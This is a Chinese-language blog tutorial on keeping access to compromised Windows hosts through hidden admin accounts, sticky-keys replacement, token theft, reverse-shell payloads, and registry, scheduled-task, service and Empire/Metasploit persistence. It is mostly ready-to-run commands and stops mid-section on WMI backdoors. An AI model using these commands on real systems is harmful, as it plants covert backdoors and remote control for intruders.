<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        Hexo
    </title>
    
<link rel="stylesheet" href="/project/libs/highlight/styles/monokai-sublime.css">

    
<link rel="stylesheet" href="/project/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/project/css/style.css">

<meta name="generator" content="Hexo 6.3.0"></head>

<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            内网渗透之权限维持
        </p>
        <hr>
    </div>
    <div class="post-content">
        <h1 id="Windows-操作系统常见持久性后门"><a href="#Windows-操作系统常见持久性后门" class="headerlink" title="Windows 操作系统常见持久性后门"></a>Windows 操作系统常见持久性后门</h1><h2 id="Windows系统隐藏账户"><a href="#Windows系统隐藏账户" class="headerlink" title="Windows系统隐藏账户"></a>Windows系统隐藏账户</h2><p>该方法是通过建立隐藏账户，制作系统用户远程控制后门，维持目标Windows系统权限。制作方法跟步骤如下：</p>
<p>（1）在目标主机cmd中输入以下命令，创建一个名为whoami$的隐藏账户，并把该隐藏账户设置为管理员权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user whoami$ Liu78963 /add</span><br><span class="line">net localgroup administrators whoami$ /add</span><br></pre></td></tr></table></figure>

<p>执行<code>net user</code>命令，发现是看不到whoami$用户的</p>
<p>虽然上面<code>net user</code>看不见该隐藏用户，但是在控制面板和计算机管理的本地用户和组中，仍然是可以看的到该用户的：</p>
<p>为了更好地隐藏我们的后门账户，我们还要开启目标主机的远程桌面进行如下操作。</p>
<p>打开注册表编辑器，找到<code>HKEY_LOCAL_MACHINE\SAM\SAM</code>，单机右建，选择“权限”，把Administrator用户的权限，设置成“完全控制”权限，然后关闭注册表编辑器，再次打开即可。</p>
<p>然后，在注册表编辑器的<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>处，点击Administrator用户，在左侧找到和在右边显示的键值的类型一项“0x1f4”相同的目录名，也就是箭头所指目录“000001F4”：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021624044.png" alt="image-20231002162407975"></p>
<p>复制<code>000001F4</code>目录中的F键的值：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021624718.png" alt="image-20231002162423630"></p>
<p>然后找到与隐藏账户whoami$右边类型的键值“0x3e9”相同的目录名，也就是。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021624801.png" alt="image-20231002162436740"></p>
<p>然后将<code>000001F4</code>的F值粘贴到<code>000003E9</code>的F值中，点击确定：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021624891.png" alt="image-20231002162448810"></p>
<p>然后从注册表中右键导出<code>000003E9</code>和whoami$，并删除whoami$用户 <code>net user whoami$ /del</code>：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021625703.png" alt="image-20231002162504620"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021625306.png" alt="image-20231002162518224"></p>
<p>此时，查看注册表以及本地用户和组或者控制面板，whoami$用户已经没有了：</p>
<p>最后，将刚才导出的两个后缀为.reg的注册表项导入注册表中：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021625486.png" alt="image-20231002162550401"></p>
<p>这样我们的隐藏账户whoami$就创建好了。现在，不管你是在命令提示符下输入 net user 或者在系统用户管理界面都是看不到whoami$这个账户的，只有在注册表中才能看得到。</p>
<h2 id="Shift-粘滞键后门"><a href="#Shift-粘滞键后门" class="headerlink" title="Shift 粘滞键后门"></a>Shift 粘滞键后门</h2><p>如果你在电脑上连按五次shift键，你就会发现电脑屏幕上弹出了一个叫做“粘滞键”的程序</p>
<p>即使在没有登录进系统之前，连按五次shift键也可以弹出这个程序</p>
<p>如果我们知道了这个程序的绝对路径，那么我们就可以将cmd.exe伪装成这个粘滞键程序，当我们连按五次shift键时，便会弹出一个CMD命令行窗口，那么我们就可以无需登录进系统便可以控制目标主机了。</p>
<p>粘滞键程序名称为“sethc.exe”，其路径为“c:\windows\system32\sethc.exe”。利用粘滞键做后门是一种比较常见的持续控制方法。其基本流程如下：</p>
<ul>
<li>首先，我们手动或利用工具，找到sethc.exe将其删除或改名为sethc.exe.bak，接着将cmd.exe程序复制一个副本，并命名为“sethc.exe”。</li>
<li>最后，重启计算机再次按下5次Shift键时，就会弹出CMD界面，后门制作成功。</li>
</ul>
<p>补充：</p>
<p>使用msf控制一台win7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ms17-010(永恒之蓝)</span><br><span class="line">search ms17-010</span><br><span class="line">use 3</span><br><span class="line">options</span><br><span class="line">set rhost 192.168.137.135</span><br><span class="line">run </span><br><span class="line"></span><br><span class="line">search ms17-010</span><br><span class="line">use 0</span><br><span class="line">set rhost 192.168.137.135</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">解决乱码：chcp 65001</span><br></pre></td></tr></table></figure>

<h3 id="（1）手动制作"><a href="#（1）手动制作" class="headerlink" title="（1）手动制作"></a>（1）手动制作</h3><p>在目标主机上执行如下命令即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd c:\windows\system32  </span><br><span class="line">move sethc.exe sethc.exe.bak   // 将sethc.exe重命名</span><br><span class="line">copy cmd.exe sethc.exe       // 将一个cmd.exe副本保存伪装成sethc.exe</span><br></pre></td></tr></table></figure>

<p>此时，我们打开目标主机的远程桌面，连续按下五次shift键，便可以看到目标主机屏幕上成功弹出了一个CMD窗口</p>
<p>该cmd是以system权限运行的，接下来我们就可以无需知道登录密码，无需登录，直接对目标主机执行各种高权限的操作了，也完全可以新建一个高权限用户直接登录进入系统，是不是很有意思？</p>
<p>但是，在一些做了防护的主机上（原版win7），即使是SYSTEM权限也是无法修改sethc.exe的：</p>
<p>只有TrustedInstaller权限才可以，这时，我们就要先模拟一个TrustedInstaller权限的令牌获取TrustedInstaller权限，然后再执行上述操作。我们的思路如下：</p>
<p>当我们启动TrustedInstaller服务时会启动进程TrustedInstaller.exe，该程序的权限为NT SERVICE\TrustedInstaller，那么我们就可以窃取该进程的令牌。</p>
<p>首先进入shell启动TrustedInstaller服务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe start TrustedInstaller       # 先进入shell启动TrustedInstaller服务</span><br></pre></td></tr></table></figure>

<p>然后执行如下即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">ps      # 找到TrustedInstaller的进程PID，这里为3476</span><br><span class="line">steal_token &lt;PID&gt;      # 从该进程中窃取令牌</span><br><span class="line">getuid   </span><br></pre></td></tr></table></figure>

<p>此时便可以对sethc.exe进行任何操作了</p>
<h3 id="（2）Empire-下的利用"><a href="#（2）Empire-下的利用" class="headerlink" title="（2）Empire 下的利用"></a>（2）Empire 下的利用</h3><p>可以使用Empire的 lateral_movement&#x2F;invoke_wmi_debugger模块自动完成以上操作。</p>
<p>该模块将为指定的目标（SETHC.exe、Utilman.exe、OSK.exe、DealActudi.exe或Max .exe）来设置调试器，使之成为选择的目标（即CMD.exe）或阶段程序。这类似于持久性&#x2F;调试器模块，但具有远程执行而不是本地执行功能。</p>
<p>补充：</p>
<p>Empire的使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">listeners</span><br><span class="line">uselistener http</span><br><span class="line">info</span><br><span class="line">set Host 192.168.137.136</span><br><span class="line">set Name shiyan</span><br><span class="line">set Port 7000</span><br><span class="line">execute</span><br><span class="line"></span><br><span class="line">back</span><br><span class="line">list(kill shiyan)</span><br><span class="line"></span><br><span class="line">launcher powershell shiyan</span><br><span class="line"></span><br><span class="line">agents</span><br><span class="line">interact Name</span><br></pre></td></tr></table></figure>

<p>假设我们已经在Empire上面获得了目标主机的session，我们可以通过该模块在目标主机上设置粘滞键后门：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usemodule lateral_movement/invoke_wmi_debugger</span><br><span class="line">set ComputerName &lt;主机名/IP&gt;</span><br><span class="line">set TargetBinary sethc.exe</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<h2 id="注册表键后门"><a href="#注册表键后门" class="headerlink" title="注册表键后门"></a>注册表键后门</h2><p>该方法是通过将需要执行的后门程序或者攻击脚本路径添加到注册表的自动启动项中，从而实现目标主机启动或登录时便会执行后门程序使我们获得其控制权限。</p>
<p>一般我们使用注册表的如下位置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run   // 开启时启动程序</span><br><span class="line">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit   // 登录时启动程序</span><br></pre></td></tr></table></figure>

<h3 id="（1）手动制作-1"><a href="#（1）手动制作-1" class="headerlink" title="（1）手动制作"></a>（1）手动制作</h3><p>首先我们制作一个metasploit后门：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lport=4444 lhost=192.168.137.136 -f exe -o backdoor.exe</span><br></pre></td></tr></table></figure>

<p>将该后门程序上传到目标主机的C:\Windows\System32目录中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /root/backdoor.exe C:\\Windows\\System32</span><br></pre></td></tr></table></figure>

<p>然后在目标主机的meterpreter执行如下命令注册表进行操作制作后门：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v backdoor -d &#x27;C:\windows\system32\backdoor.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v backdoor   #查看键值</span><br></pre></td></tr></table></figure>

<p>此时我们重新开一个metasploit监听，然后输入“shutdown -r -t 0”命令让目标主机重启，当目标主机重新启动后便会启动执行backdoor.exe后门程序，我们攻击机的新开的metasploit监听上就会成功上线：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.137.136</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>我们还可以操作注册表的Userinit键：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br></pre></td></tr></table></figure>

<p>让目标主机在用户进行登陆时，winlogon运行指定的后门程序。</p>
<p>除此之外还有以下可利用的注册表键：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce // 只会在开机时启动一次</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices   </span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br></pre></td></tr></table></figure>

<h3 id="（2）Metasploit-下的利用"><a href="#（2）Metasploit-下的利用" class="headerlink" title="（2）Metasploit 下的利用"></a>（2）Metasploit 下的利用</h3><p>Metasploit通过使用Meterpreter脚本和后渗透模块来支持通过注册表的持久性。Meterpreter脚本将以VBS脚本的形式创建一个有效payload，该payload将被上传到目标主机的磁盘上，并创建一个注册表项，该注册表项将在用户登录期间循环运行该有效负载。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run exploit/windows/local/persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r 192.168.137.136</span><br><span class="line">run exploit/windows/local/persistence -X -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r 192.168.137.136</span><br><span class="line"></span><br><span class="line">run persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r 192.168.137.136</span><br><span class="line">run persistence -X -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r 192.168.137.136</span><br></pre></td></tr></table></figure>

<ul>
<li>-U指定启动方式为用户登录时自启动</li>
<li>-X指定启动的方式为开机自启动</li>
<li>-P 指定所使用的payload</li>
<li>-i不断尝试反向连接的时间间隔，我们这里设置的是5秒钟执行一次</li>
<li>–r指定攻击者的ip</li>
<li>-p 指定攻击者监听的端口</li>
</ul>
<p>生成后门后，只要目标主机重启或者登录，我们将在特定的时间间隔保持meterpreter会话了。</p>
<p>（这部分有问题，文章给的34，persistence报错，换成12后，命令无回显，无法成功执行）</p>
<h3 id="（3）Empire-下的利用"><a href="#（3）Empire-下的利用" class="headerlink" title="（3）Empire 下的利用"></a>（3）Empire 下的利用</h3><p>在Empire上面有一个persistence&#x2F;userland&#x2F;registry后渗透模块，可以自动帮我们完成上面手动创建注册表后门的任务。</p>
<p>假设我们已经在Empire上面获得了一个目标主机的session，我们可以通过设置该模块在目标主机上创建注册表后门：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/userland/registry</span><br><span class="line">set Listener &lt;监听名&gt;</span><br><span class="line">set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">set Agent &lt;Agent&gt;</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<p><strong>注意：杀毒软件针对此类注册表后门有专门的查杀机制。</strong></p>
<h2 id="Windows-计划任务后门"><a href="#Windows-计划任务后门" class="headerlink" title="Windows 计划任务后门"></a>Windows 计划任务后门</h2><p>计划任务可以让目标主机在特定的时间执行我们预先准备的后门程序从而使我们获得目标系统的控制权。计划任务的持久化技术可以手动实现，也可以自动实现。有效负载可以从磁盘或远程位置执行，它们可以是可执行文件、powershell脚本或scriptlet的形式。</p>
<h3 id="（1）利用-at-命令"><a href="#（1）利用-at-命令" class="headerlink" title="（1）利用 at 命令"></a>（1）利用 at 命令</h3><p>at 命令是Windows自带的用于创建计划任务的命令，但是他主要工作在Windows Server 2008之前版本的操作系统中。我们可以通过at命令通过跳板机在目标主机DC上创建计划任务，让计算机在指定的时间执行木马程序，从而获得对内网目标主机的控制。</p>
<p>1.首先在目标主机上传metasploit生成的后门程序（位于注册表键后门-&gt;手动注册部分）</p>
<p>2.然后进入目标主机的shell使用net time命令确定目标主机的当前时间：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time</span><br></pre></td></tr></table></figure>

<p>3.接着在目标主机的shell中使用at命令创建计划任务，让目标主机在指定的时间运行metasploit木马程序：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at 15:01:00 /every:M,T,W,Th,F c:\windows\system32\backdoor.exe</span><br></pre></td></tr></table></figure>

<p>目标主机将在每个工作日的15:01:00执行后门程序，我们便可以在这个时间获得目标机器的控制权：</p>
<h3 id="（2）利用-schtasks-命令"><a href="#（2）利用-schtasks-命令" class="headerlink" title="（2）利用 schtasks 命令"></a>（2）利用 schtasks 命令</h3><p>上面我们讲了用at命令创建计划任务，但是该命令已经被Windows Vista、Windows Server 2008及之后版本的操作系统废弃了，代替他的是schtasks命命令。schtasks命令比at命令更为灵活、自由。下面来演示schtasks命令的使用，于是，攻击者开始使用schtasks命令来代替at命令。</p>
<p>利用schtasks创建后门的大致流程如下：</p>
<p>1.首先在目标主机上传metasploit生成的后门程序。</p>
<p>2.然后在目标主机上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序为我们之前到C盘下的backdoor.exe，启动权限为system。命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn backdoor /sc minute /mo 1  /tr c:\windows\system32\backdoor.exe /ru system /f</span><br></pre></td></tr></table></figure>

<p>然后新开一个metasploit监听，等待一分钟后这个监听便收到了目标主机的session，并且这个session还是system权限的。</p>
<h3 id="（3）利用SharPersist工具"><a href="#（3）利用SharPersist工具" class="headerlink" title="（3）利用SharPersist工具"></a>（3）利用SharPersist工具</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/fireeye/SharPersist/releases">https://github.com/fireeye/SharPersist/releases</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/fireeye/SharPersist">https://github.com/fireeye/SharPersist</a></p>
<p>SharPersist的创建是为了帮助使用多种不同的技术在Windows操作系统上建立持久性。它是一个国外安全人员用C#编写的命令行工具，可以反射性的加载Cobalt Strike的“execute-assembly”命令或任何其他支持反射性加载.NET程序集的框架。SharPersist采用模块化设计，以便将来添加新的持久性技术。还有一些与tradecraft相关的项已经内置到该工具及其支持的持久性技术中，例如file time stomping策略和最小化或隐藏运行应用程序。</p>
<p>该工具支持的持久性技术有：</p>
<ul>
<li><code>keepass</code>-keepass配置文件后门</li>
<li><code>reg</code>-注册表项添加&#x2F;修改</li>
<li><code>schtaskbackdoor</code>-通过向后门计划任务添加其他操作来完成该任务</li>
<li><code>startupfolder</code>-启动文件夹中的lnk文件</li>
<li><code>tortoisesvn</code>-乌龟svn钩子脚本</li>
<li><code>service</code>-创建新的Windows服务</li>
<li><code>schtask</code>-创建新的计划任务</li>
</ul>
<p>如果用户具有管理员级别的特权，则可以通过SharPersist工具创建一个新的计划任务，该任务将在Windows登录期间执行我们上传好的有效载荷。</p>
<p>1.在目标主机上传我们新生成的metasploit木马和SharPersist程序：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload /tmp/backdoor2.exe C:\\users\\Yb\\backdoor2.exe</span><br><span class="line">upload /tmp/SharPersist.exe C:\\users\\Yb\\desktop</span><br></pre></td></tr></table></figure>

<p>2.然后使用以下命令创建我们恶意的计划任务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharPersist.exe -t schtask -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c C:\Users\Yb\backdoor2.exe&quot; -n &quot;backdoor2&quot; -m add -o logon</span><br></pre></td></tr></table></figure>

<p>然后新开一个metasploit监听，等待目标主机重启后便可以收到目标主机的session，并且还是system权限</p>
<p>（本工具有 .NET Framework 版本要求）</p>
<h3 id="（4）Empire-下的利用"><a href="#（4）Empire-下的利用" class="headerlink" title="（4）Empire 下的利用"></a>（4）Empire 下的利用</h3><p>Windows计划任务后门我们可以用Empire上的persistence&#x2F;elevated&#x2F;schtasks后渗透模块在目标主机上进行设置。</p>
<p>设置方法如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usemodule powershell/persistence/elevated/schtasks</span><br><span class="line">set Listener &lt;监听名&gt;</span><br><span class="line">set Agent &lt;Agent&gt;</span><br><span class="line">set DailyTime 19:50</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<p>（报错<code>[!] Error: module needs to run in an elevated context.</code>）</p>
<p>如果成功在目标主机上设置计划任务后门，将每天19:50执行基于PowerShell的有效负载，并反弹一个高权限的session</p>
<h2 id="Windows-服务后门"><a href="#Windows-服务后门" class="headerlink" title="Windows 服务后门"></a>Windows 服务后门</h2><p>在Windows主机上，获得了管理员的权限后，我们可以通过创建服务并将服务设置自启动的方式，来对目标主机进行持久控制。</p>
<p>如果未正确配置Windows环境中的服务或这些服务可以用作持久性方法，则这些服务可能导致权限提升。创建一个新的服务需要管理员级别的特权，它已经不是隐蔽的持久性技术。</p>
<h3 id="利用sc命令手动创建"><a href="#利用sc命令手动创建" class="headerlink" title="利用sc命令手动创建"></a>利用sc命令手动创建</h3><p>1.首先在目标主机上传新生成的msf木马：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /tmp/backdoor.exe C:\\users\\Yb\\</span><br></pre></td></tr></table></figure>

<p>如果帐户具有本地管理员特权，则可直接利用sc命令从目标主机的命令行中创建服务。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create backdoor binpath= &quot;C:\Users\Yb\backdoor.exe&quot; start= auto // 创建服务后门</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>binpath：</strong>用于执行任意有效负载</li>
<li><strong>auto：</strong>用于确保恶意服务将自动启动。</li>
</ul>
<p>注意，所有选项的每个&#x3D;号之前 一定不要有空格 &#x3D;号后面一定要有空格，否则会错误。</p>
<p>服务创建成功，然后我们可以在攻击机上重新开启一个metasploit监听，等目标机重启时，目标机就会上线，成功得到了目标机的meterpreter，并且还是system权限的</p>
<p>也可以执行“sc start backdoor”命令立即启动该服务。</p>
<p>注意：我们在新开启的metasploit监听中，使用<code>set AutoRunScript migrate -f</code>设置了自动迁移进程，这是因为当一个进程在Windows系统中启动后，必须与服务控制管理器进行通信，如果没有进行通信，服务控制管理器会认为出现了错误，进而终止这个进程，所以如果我们不设置自动迁移进程，这个meterpreter会很快就断掉了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set AutoRunScript migrate  -f</span><br><span class="line">set lhost 192.168.137.136</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="利用SharPersist工具创建"><a href="#利用SharPersist工具创建" class="headerlink" title="利用SharPersist工具创建"></a>利用SharPersist工具创建</h3><p>除了利用上面的sc命令，我们还可以利用SharPersist工具。SharPersist支持在受感染系统中创建新服务的持久性技术，在系统上安装新服务需要本地管理员。</p>
<p>1.在目标主机上传新生成的metasploit木马程序backdoor2.exe和SharPersist.exe程序：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload /tmp/backdoor2.exe C:\\users\\Yb\\backdoor2.exe</span><br><span class="line">upload /tmp/SharPersist.exe C:\\users\\Yb\\desktop</span><br></pre></td></tr></table></figure>

<p>2.使用以下命令添加新服务，该服务将在Windows启动期间执行任意的有效负载：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharPersist.exe -t service -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c C:\Users\Administrator\backdoor2.exe&quot; -n &quot;backdoor2&quot; -m add</span><br></pre></td></tr></table></figure>

<p>我们在攻击机上新开启一个metasploit监听，当目标主机重启时，目标主机便能上线，如果成功得到目标机的meterpreter，并且还是system权限的</p>
<p>注意：不要忘记迁移进程。<code>set AutoRunScript migrate -f</code></p>
<h3 id="Metasploit下的利用"><a href="#Metasploit下的利用" class="headerlink" title="Metasploit下的利用"></a>Metasploit下的利用</h3><p>Metasploit框架还具有一个后渗透模块：“post&#x2F;windows&#x2F;manage&#x2F;persistence_exe”，该模块需要以下配置，并将可执行文件放置在目标主机的可写位置：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021626587.png" alt="image-20231002162659500"></p>
<p>如上图所示，该模块支持的持久性技术有：</p>
<ol>
<li>注册表运行键后门（USER，即我们前文提到的“run persistence”命令就是用的这个技术）</li>
<li>Windows服务后门（SERVICE）</li>
</ol>
<p>使用该模块创建服务后门时，需要将启动变量修改为SERVICE，以便在系统上安装新服务。以下是创建服务的设置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/manage/persistence_exe </span><br><span class="line">set REXEPATH /tmp/backdoor.exe       // 攻击机本地要上传到目标机的paylaod路径</span><br><span class="line">set SESSION 1 </span><br><span class="line">set STARTUP SERVICE </span><br><span class="line">set LOCALEXEPATH C:\\Users\\Yb     // payload上传到目标机后存放的路径</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>服务后门创建成功，之后的使用方式与前面相同。</p>
<p>除此之外，在metasploit上，我们还可以用metsvc模块创建服务，建立持久后门。metsvc后渗透攻击模块其实就是将Meterpreter以系统服务的形式安装到目标主机，它会上传三个文件：</p>
<ul>
<li>metsvc.dll</li>
<li>metsvc-service.exe</li>
<li>metsvc.exe</li>
</ul>
<p>并通过服务启动，服务名为meterpreter。</p>
<p>常用命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –h   # 查看帮助</span><br><span class="line">run metsvc –A   #自动安装后门</span><br></pre></td></tr></table></figure>

<p>我们使用<code>run metsvc –A</code>自动安装后门</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021627787.png" alt="image-20231002162721705"></p>
<p>接着我们启用另一个终端并进入msfconsole，使用如下命令即可连接后门：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br><span class="line">set RHOST 192.168.137.135      //目标机ip</span><br><span class="line">set LPORT 31337     //如上图，后门安装过程信息中有</span><br><span class="line">exploit     //获取到的会话是system权限</span><br></pre></td></tr></table></figure>

<p>（没成功）</p>
<h2 id="WMI-型后门"><a href="#WMI-型后门" class="headerlink" title="WMI 型后门"></a>WMI 型后门</h2><p>WMI是微软基于Web的企业管理（WBEM）的实现版本，这是一项行业计划，旨在开发用于访问企业环境中管理信息的标准技术。</p>
<p>WMI型后门通常是由PowerShell编写的，可以直接从新的WMI属性中读取和执行后门代码、给代码加密。通过这种方法，攻击者可以在系统中安装一个具有持久性的后门，且不会在系统磁盘中留下任何文件。</p>
<blockquote>
<p>WMI型后门主要使用了WMI的两个特征，即无文件和无进程。其基本原理是：将代码加密存储在WMI中，达到所谓的“无文件”；当设定的条件被满足时，系统将自动启动PowerShell进程去执行后门程序，执行后，进程将会消失，达到所谓的“无进程”。</p>
</blockquote>
<p>注意：WMI型后门只能由具有管理员权限的用户运行。</p>
<blockquote>
<p>在2015年的Black Hat大会上Matt Graeber介绍了一种无文件后门就是用的WMI。其主要与Powershell命令配合使用可以实现无文件攻击重要方式，具有良好的隐蔽性也是目前较为常用的持久化手段。Black Hat 2015公布了一个WMIBackdoor的poc毕竟还是经典，在流行的powersploit与nishang框架里面也有相关的ps1文件。传送门：<a target="_blank" rel="noopener" href="https://github.com/mattifestation/WMI_Backdoor">https://github.com/mattifestation/WMI_Backdoor</a></p>
</blockquote>
<p>在Empire下有一个叫Invoke-WMI的后渗透模块（persistence&#x2F;elevated&#x2F;wmi），可以创建WMI型后门。</p>
<p>设置如下：</p>
